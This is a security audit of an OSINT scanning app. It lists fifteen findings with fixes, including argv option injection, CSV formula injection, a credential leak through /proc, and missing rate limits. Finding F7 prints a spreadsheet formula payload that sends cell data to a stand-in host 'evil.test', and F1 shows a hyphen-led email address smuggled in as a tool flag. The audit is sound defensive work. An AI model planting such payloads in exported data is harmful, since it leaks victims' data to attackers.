# Code-level security audit — 2026-08-30

Scope: the whole repository — 22,778 lines across 186 Swift files, the report
subprocess, and the browser frontend. Earlier audits in this directory assessed
production posture and rollout; this one reads the code. Every finding below was
traced to a concrete path, not inferred from a pattern match.

This audit was published as complete twice before it was. The first pass covered
Swift and Python only; the frontend renders findings — text lifted from
third-party pages — into the DOM and into a client-generated file, which is
where this class of bug actually lives, and F7 and F8 came from closing that
gap. The second pass still omitted the shell: two dozen scripts, several of
which run as root, hold credentials, or rewrite the web server's configuration.
F9 to F14 come from closing that one. Both omissions are recorded rather than quietly
patched, because "audited" is a claim about coverage and a reader cannot check
coverage they were not told about.

## Findings

### F1 — Medium: the pivot path bypassed the input validator

`PivotExtractor.candidates` produced scan targets that never passed
`InputValidator.validateScanInput`. Those targets are attacker-controlled in
exactly the way `/scan` input is — they come from a third party's page, API
response or commit metadata — but only the front door was gated.

The validator rejects a leading hyphen with an explicit reason: *"so a target can
never be interpreted as a flag by a downstream argv-based tool (whois/holehe)."*
The pivot path reopened precisely that control.

Reachable chain, all steps verified in source:

1. Anyone may set an arbitrary git author address and push it to a public
   repository.
2. `UsernamePlugin` harvests commit author addresses from a target's public
   events and emits them at confidence 0.9 — above `minPivotConfidence` (0.8).
3. `PivotExtractor.isScannable` accepts `-x@evil.test`: its character class
   `[a-z0-9._%+-]` allows a leading hyphen.
4. Shape gating routes the candidate to `BulkEmailPlugin`.
5. `EmailAddress.normalize` permits it — the RFC local-part grammar allows a
   leading hyphen.
6. `BoundedProcess.run(arguments: [cleanedEmail, "--only-used", "--no-color"])`
   hands it to holehe as its first argument, where it parses as an option.

Impact is bounded — arguments are passed as argv with no shell, so an unknown
option makes holehe exit non-zero and the plugin returns nothing — but the blast
radius depends on a third-party tool's option set, which is not ours to rely on.
`isScannable` also admitted `%`, which the front door forbids and which reaches
plugin URL-path construction.

**Fixed.** Pivot candidates now pass through `InputValidator.validateScanInput`
and must survive it unchanged. This subsumes the SSRF check added earlier the
same day, so one gate now governs every entry point. Regression tests cover the
hyphen and percent cases and were verified against a positive control: both fail
with the validator call removed.

### F2 — Low: GraphML export could be made unparseable by upstream content

`IdentityGraph.esc` escaped the five XML entities in the correct order but did
not remove control characters, which XML 1.0 forbids outright — escaping cannot
rescue them, so a conforming parser rejects the whole document.

Finding text is lifted from third-party pages (a page title via `SiteMeta`, a
WHOIS record via `DomainPlugin`), and `PluginResultLimits.sanitize` truncates but
does not strip control bytes. A victim who scanned attacker-controlled
infrastructure could therefore receive a GraphML export nothing would open. Not
cross-site scripting: the response is `Content-Disposition: attachment`.

**Fixed.** `esc` drops control characters other than tab, LF and CR before
escaping.

### F3 — Low: two different policies for anonymous scans — fixed

`Scan.authorizeRead` treats an ownerless scan as capability access — anyone
holding the 122-bit scan ID may read it, which is deliberate and documented.
`ReportController` carried its own copy of the rule and treated the same scan as
admin-only.

Filed first as informational on the reasoning that the stricter rule sat on the
more sensitive artifact. That reasoning does not survive contact with the other
endpoint: `GET /export/:id` returns the same findings under the capability rule,
*plus* result IDs and per-result metadata the PDF omits. The divergence
protected nothing and cost a real thing — a logged-out user could download every
other export of the scan they had just run, but not the report.

**Fixed** (`c5cb053`). The handler calls `authorizeRead`, so there is one policy
in one place. Two tests hold it: an anonymous scan's report must not answer
`403` where its JSON export answers `200`, and an owned scan's report must still
refuse a stranger.

The same handler was also the only export of this data that wrote no audit
record; it now logs `export_pdf` like its four siblings.

### F4 — Informational: silent unkeyed blind-index fallback

`FieldCrypto.blindIndex` falls back to unkeyed `sha256Hex` when
`TokenEncryption` is unconfigured. An unkeyed hash of an email address is
reversible by dictionary attack, defeating the point of a blind index.
Production cannot reach this: `configure.swift` calls
`TokenEncryption.validateConfiguration(required: app.environment == .production)`
and refuses to boot without a valid key. The residual risk is a non-production
environment pointed at real data, which would write reversible indexes without
logging anything.

### F5 — Informational: polynomial backtracking on attacker-influenced text

`Correlator`'s unanchored extraction regexes contain ambiguous splits — notably
`[a-zA-Z0-9.\-]+\.`, where the class contains the literal that follows it.
Backtracking is polynomial rather than exponential, and input is capped at
`maxRawDataBytes` (8 KB), so this is bounded. Recorded so a future change to
either the pattern or the cap is made with it in mind.

### F6 — Informational: admin authorization was per-handler — fixed

Every admin handler checked `isAdmin` immediately after resolving the user, and
all of them did it correctly, so there was no vulnerability. The weakness was
that it was only a convention. The admin surface spans **two** controllers —
`AdminController` and `UserController`'s `/admin/scans` — so "every admin
handler remembers the guard" was a property nobody enforced, and a seventh route
added elsewhere would have depended on its author noticing the pattern.

`APIKeyRoutePolicy` already denies API keys on admin routes and fails closed on
unclassified ones, but that governs API-key authentication only; session-
authenticated access had no structural gate.

**Fixed.** `AdminMiddleware` now guards both registrations. The per-handler
checks are deliberately kept alongside it rather than replaced: the middleware
covers a handler that forgets its own check, and the handler check covers a route
registered outside the group. Neither is redundant, because each fails in the
case the other cannot see.

The guarantee is verified structurally: a test enumerates Vapor's **live route
registry** for every path beginning with `admin` and asserts each refuses an
unauthenticated caller, so a new admin route is covered the day it is registered
rather than the day someone remembers to add it to a list. Checked against a
positive control — an unguarded `/admin/leaky-probe` makes the test fail with
that exact route named.

### F7 — Medium: formula injection in the client-side CSV export

The backend has no CSV writer, which the first pass correctly established — and
then wrongly concluded the class did not apply. The **frontend** builds the CSV
itself (`index.html`, the `export-csv-btn` handler), writing `r.rawData` into
cells quoted only for embedded double-quotes.

RFC 4180 quoting makes the file parse correctly; it does nothing about formula
injection. Excel, LibreOffice and Google Sheets evaluate a cell whose value
begins with `=`, `+`, `-` or `@` — the surrounding quotes are stripped before
that decision is made.

`rawData` is third-party text by construction: `SiteMetaPlugin` stores a scanned
page's `<title>`, `DomainPlugin` stores WHOIS output, `PastebinPlugin` stores
paste excerpts. An attacker who controls a page the victim scans controls a cell
in the victim's spreadsheet. `=HYPERLINK("https://evil.test?x="&A1,"click")`
exfiltrates neighbouring data on click, and `=IMPORTXML(...)` fires without any
interaction in Sheets.

**Fixed.** Cells beginning with a formula-leading character — including the tab
and carriage-return variants used to bypass naive checks — are prefixed with an
apostrophe, which marks them literal text in all three applications. Verified
against six published vectors, with an ordinary finding confirmed to pass
through unchanged. The download filename now follows the same allowlist
discipline the server applies to `Content-Disposition`.

### F8 — Low: unescaped interpolation into an HTML sink on the map

`index.html` passed GeoIP fields into Leaflet's `bindPopup`, which takes an HTML
string, without escaping. Not reachable today: the values come from the offline
MaxMind database rather than from a scanned page, and the frontend renders only
lookups with `status === "success"`, which requires `query` to have parsed as an
address. It was, however, the one place in that file where third-party text met
an HTML sink unescaped — `createResultCard` sets the opposite standard three
thousand lines earlier, in a template of empty placeholders filled by
`textContent`, with a comment saying so.

**Fixed.** The five interpolations are escaped, which also removes any need to
reason about the hygiene of a vendor data file.

### F9 — Medium: the gate did not cover the scripts most worth gating

`.github/workflows/ci.yml` ran `bash -n`, `shellcheck` and the shell test suite
against a bash array pasted into the workflow. Three scripts added after that
array was last edited were absent from it: `alert-notify.sh`, `healthcheck.sh`
and `config-manifest.sh`. All three run as root; the first reads the alert
relay's API key and builds an HTTP request from a failed unit's journal. Nothing
reported the gap — an unlisted script simply was not checked, and the job still
passed green.

The test list had the same shape and the same defect in waiting: a new
`scripts/tests/*.test.sh` would not have run.

This is the fifth instance of one pattern in this codebase — a hand-maintained
list drifting from the reality it describes (see also the risk-scorer type
table, the pivot-key set, the plugin TTL map and the admin route surface).

**Fixed** (`a2e17ad`). `scripts/lint-scripts.sh` derives its own inputs: every
file in Git's view of the tree — tracked, plus untracked and not ignored, so a
script is covered before it is ever committed — whose first line is a shell or
Python shebang. That is what makes the extensionless `ops/libexec/update-swift-csp`
appear on its own. Discovery found 29 scripts against the array's 25.

`self-test` is the control, and it is not decorative: five deliberately broken
fixtures (a parse error, a shellcheck-only finding, an extensionless script, a
Python syntax error, and a discovery check) plus one clean fixture that must
pass, so a gate that silently stopped inspecting anything fails loudly. The
first thing the new gate did was reject its own source for two shellcheck
findings.

### F10 — Low: the database password was reachable through `/proc`

`backup.sh` invoked the dump as `env -i PATH=… PGPASSWORD="$DATABASE_PASSWORD"
pg_dump …`. The rest of that line is careful — `env -i` deliberately drops
inherited libpq configuration so nothing can redirect the dump — but the
password is an *argument to `env`*, and `/proc/<pid>/cmdline` is world-readable.
Between `env` starting and `env` exec'ing `pg_dump`, any local account can read
the credential. The window is short and the attacker must already be running
code on the box; the host is shared with other services, and the backup runs on
a predictable timer.

**Fixed** (`1f67207`). libpq now reads a passfile: mode 0600 inside a 0700
private directory created per run, removed on exit and on the success path.
Host and port are wildcards because `DATABASE_HOST` is already restricted to
approved local endpoints, which keeps one line correct for both TCP and socket
connections. Only the password can contain the separators the format reserves,
so only it is escaped — backslashes before colons, since the other order
double-escapes.

The contract test asserts `PGPASSWORD` is *unset* in the dump's environment,
that the passfile and its directory carry the right modes, and that a password
containing both reserved characters survives escaping intact; removing the colon
escaping makes it fail. Because a mocked `pg_dump` never exercises libpq, the
change was also run end to end against the production database: dump, encrypt,
decrypt, gzip verification, rotation, 31,627 encrypted bytes.

### F11 — Low: the alert body was passed through `curl`'s argv

`alert-notify.sh` built its JSON carefully — `json.dumps`, so no log line can
break out of the string it belongs in — and then handed it to `curl` as
`--data "$payload"`. The API key was already kept out of argv via a header
file; the body was not. It carries the failed unit's `systemctl status` and
journal tail, and unlike F10 the exposure lasts the whole request: up to twenty
seconds, times three attempts.

**Fixed** (`47b3e4a`). The payload is written to a file and sent with
`--data-binary @file`, which also preserves the bytes exactly rather than
stripping newlines the way `--data` does. Verified by delivering a real alert
through the systemd path.

### F12 — Informational: unvalidated numbers reaching bash arithmetic

`alert-notify.sh` validated `ALERT_MIN_INTERVAL_SECONDS` but not
`ALERT_LOG_LINES` or `ALERT_MAX_BODY_BYTES`; `healthcheck.sh` validated none of
its three thresholds. Each lands in `(( … ))`, where bash evaluates its operand
as an arithmetic *expression* — an array subscript there is a command
substitution, so an unvalidated value is code execution rather than a wrong
number.

Not reachable today: every one of these comes from a root-owned unit file or
environment file, and an attacker who can write those already has root. It is
listed because that reasoning is the only thing making it safe, and it is
invisible at the point of use.

**Fixed** (`47b3e4a`). Both scripts reject a non-integer before the first
arithmetic context.

### F13 — Informational: the drift gate could disappear silently

`healthcheck.sh` ran the configuration-drift check only `if [[ -x … ]]`. Deleting
or chmod-ing `config-manifest.sh` would therefore have turned drift detection
off with no signal — a probe reporting "all checks passed" while silently
checking one thing fewer. Its sibling backup gate already reported a missing
helper as a problem.

**Fixed** (`47b3e4a`). A configured-but-missing helper is now a reported
problem; opting out requires setting `HEALTHCHECK_CONFIG_MANIFEST=` explicitly.

### F14 — Informational: a second, hand-frozen Cloudflare trust list — open

Outside this repository, but found while auditing what writes to nginx and
worth writing down. `update-cloudflare-ips.sh` regenerates
`conf.d/cloudflare-origin-guard.conf` from Cloudflare's published ranges and
defines `$from_cloudflare_origin`, which every swift-vapor vhost gates on. The
host also carries `conf.d/cloudflare-geo.conf`, a hand-written copy of the same
data defining `$cf_edge`, last touched 2026-08-16, regenerated by nothing and
verified by nothing. `config-manifest.sh` deliberately excludes
`cloudflare-*.conf`, so it does not pin that file either.

Exactly one vhost still reads it — `video.micutu.com`, another project on the
shared box. The two lists agree today. They will not agree forever: when
Cloudflare releases a range and it is reassigned, the frozen copy keeps trusting
it, and that vhost's origin guard starts admitting whoever holds it.

**Open, and deliberately not fixed here.** The change is one line in another
project's vhost (`$cf_edge` → `$from_cloudflare_origin`) plus deleting the stale
file, and that is the operator's call, not this repository's.

While checking this, `update-cloudflare-ips.sh --check` was found reporting the
live real-IP snippet as stale. The ranges were identical; only a comment line
differed from the current generator. Refreshed, so the check is green again — a
gate that is permanently red is a gate nobody reads.

### F15 — Low: the one endpoint that spawns a subprocess had no rate limit

Rate limiting is applied per controller, by hand, at `boot`. Nine controllers
carried none. Most of those are authenticated and cheap; one was neither.

`GET /report/:id` spawns a Python process per request — up to 30 seconds of CPU
and 20 MB of output, bounded per-process by `BoundedProcess` but not in
aggregate. After F3 it is reachable by capability, so anyone holding a scan ID
— including their own, freshly created — could open concurrent requests and buy
a subprocess with each one. The neighbouring capability reads were unbounded
too: the four `/export/:id` formats, `/identity/:id`, `/scans/:id/timeline` and
both diff endpoints each serialise or recompute over every result in a scan.

**Fixed** (`c5cb053`). The report gets the tightest budget in the application
(3 anonymous / 10 authenticated per minute); the export formats share 10/60; the
remaining capability reads take 20/120. `/correlations` — authenticated, but it
loads every completed scan the caller owns and correlates across all of them —
takes 30 per minute.

The test that holds this enumerates the capability-read surface from Vapor's
live route registry and fires 26 anonymous requests at each route with a random
scan ID: the limiter runs before the handler, so a `404` still spends the
budget, which makes the probe cheap and aims it at the middleware rather than
the route. Removing any one limiter fails it.

## Verified clean

Stating only defects would misrepresent the codebase. The following were examined
and found sound:

- **SQL injection.** Every `.raw` interpolation uses `bind:` or `ident:`. The one
  dynamic identifier is a compile-time model constant (`Scan.schema` and peers).
- **Command injection.** No shell is invoked anywhere. `BoundedProcess` requires
  an absolute executable path, passes argv, supplies an explicit environment
  rather than inheriting one, allocates a private `HOME`/`TMPDIR`, and bounds
  stdout, stdin and wall-clock time. Report data reaches Python over stdin as
  JSON, never as an argument.
- **Sessions and passwords.** `__Host-` cookie prefix, `Secure`, `HttpOnly`,
  `SameSite=strict`, absolute TTL. Bcrypt cost 12, with a dummy hash computed on
  unknown users to flatten the timing signal.
- **Secrets and tokens.** Share tokens are 192 bits from `SystemRandomNumber-`
  `Generator`, stored only as hashes; API keys likewise; 2FA recovery codes carry
  ~2^59.5 entropy and are consumed under a row lock, so a code cannot be spent
  twice concurrently. Comparisons that matter are constant-time; the rest compare
  hashes, not secrets.
- **Output encoding.** The HTML report escapes every interpolation that is not a
  static stylesheet, an integer, or an already-escaped fragment, ampersand first.
  The PDF path uses `fpdf.cell`, which places literal text with no markup
  interpretation, after stripping newlines and capping length.
- **Header injection.** `safeName` reduces filenames to an allowlist of letters,
  digits, `_` and `-`, so no CR/LF or quote can reach `Content-Disposition`.
- **SSRF.** `OutboundHTTP.pinnedDestination` gates every plugin request through
  `SSRFGuard.isInternalURL` and pins the validated address, mitigating rebinding.
- **Server-side export formats.** JSON, Markdown, HTML, PDF and GraphML; no CSV
  writer exists on the server. The client-side CSV export is F7.
- **Privilege escalation.** No `Content`-decoded struct carries `isAdmin` or any
  role field, so no update endpoint can be coaxed into granting it.
- **Logging.** No secret, token, scan target or email address is interpolated
  into a log line; audit records store an IP prefix that is anonymised and then
  encrypted.
- **Boot gates.** Production refuses to start without a valid encryption key or
  audit signing key, and bounds notification, export and dark-web configuration
  at startup rather than trusting them at use.
- **Shell scripts.** No `eval`, no `source` of a variable path, no shell string
  built from remote data. Every temporary file comes from `mktemp` — never a
  predictable `/tmp` name — and the privileged writers place their temporary
  file in the *destination* directory so the publish is a rename within one
  filesystem rather than a copy across a window. Retention parses generated UTC
  names instead of `ls`, and never accepts a caller-supplied removal target.
- **Downloads.** The VoidAccess installer pins `--proto '=https'` and
  `--proto-redir '=https'`, checks SHA-256 on both the archive and the model
  wheel, and installs Python dependencies with `--require-hashes`. The Cloudflare
  fetch now pins the same way (`47b3e4a`), and its response is parsed
  through `ipaddress` with a plausibility floor before a single byte reaches an
  nginx trust list.
- **The privilege boundary.** `update-swift-csp` is the only thing the deploy
  account may run as root beyond two fixed `systemctl` verbs. It accepts nothing
  but syntactically valid SHA-256 source hashes, holds every path and directive
  itself, verifies its own output before installing it, and rolls the previous
  snippet back if `nginx -t` or the reload fails.
- **Secrets in scripts.** After F10 and F11, no script places a credential in
  argv. `restore-drill.sh` passes `--passphrase-file`; `backup.sh` reads private
  scalars from files, rejects inline passwords outright, and refuses a
  world-readable credential file.
- **Frontend DOM sinks.** 71 `innerHTML` uses across three non-vendored files,
  against 177 uses of `textContent`. The result renderer is a static template of
  empty placeholders filled by `textContent`, deliberately and with a comment.
  `investigation.js` and `admin.js` escape in both attribute and text contexts,
  the former noting that entity types can arrive from imported GraphML. No
  `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval` or `srcdoc`
  anywhere. The single unescaped sink was F8.
